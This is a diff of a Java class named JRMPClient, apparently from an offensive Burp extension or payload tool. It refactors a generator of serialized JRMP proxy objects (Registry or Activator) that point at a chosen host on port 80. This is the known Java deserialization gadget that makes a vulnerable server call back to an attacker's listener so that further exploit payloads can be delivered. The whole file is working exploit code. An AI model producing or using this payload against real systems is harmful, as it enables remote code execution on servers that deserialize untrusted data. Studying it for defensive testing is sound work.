@@ -1,8 +1,9 @@
-package burp;
+package payloads;
 
 import java.io.ByteArrayOutputStream;
 import java.io.ObjectOutputStream;
 import java.lang.reflect.Proxy;
+import java.rmi.Remote;
 import java.rmi.activation.Activator;
 import java.rmi.registry.Registry;
 import java.rmi.server.ObjID;
@@ -15,36 +16,26 @@ import sun.rmi.transport.LiveRef;
 
 public class JRMPClient {
 
-    private static Registry getObject(String host) {
-        int port = 1234;
-
+    @SuppressWarnings("unchecked")
+    private static <T extends Remote> T getObject(String host, Class<T> wrapper) {
         ObjID id = new ObjID(new Random().nextInt());
-        TCPEndpoint te = new TCPEndpoint(host, port);
+        TCPEndpoint te = new TCPEndpoint(host, 80);
         UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
         RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
-        Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[]{Registry.class}, obj);
-        return proxy;
-    }
-
-    private static Activator getActivator(String host) {
-        int port = 1234;
-
-        ObjID id = new ObjID(new Random().nextInt());
-        TCPEndpoint te = new TCPEndpoint(host, port);
-        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
-        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
-        Activator proxy = (Activator) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[]{Activator.class}, obj);
+        T proxy = (T) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[]{wrapper}, obj);
         return proxy;
     }
 
     public static byte[] getPayloadBytes(String host, String type) throws Exception {
         final ByteArrayOutputStream byteOut = new ByteArrayOutputStream();
         final ObjectOutputStream objOut = new ObjectOutputStream(byteOut);
+        Class<? extends Remote> wrapper;
         if (type.equalsIgnoreCase("activator")) {
-            objOut.writeObject(getActivator(host));
+            wrapper = Activator.class;
         } else {
-            objOut.writeObject(getObject(host));
+            wrapper = Registry.class;
         }
+        objOut.writeObject(getObject(host, wrapper));
         objOut.flush();
         objOut.close();
         return byteOut.toByteArray();
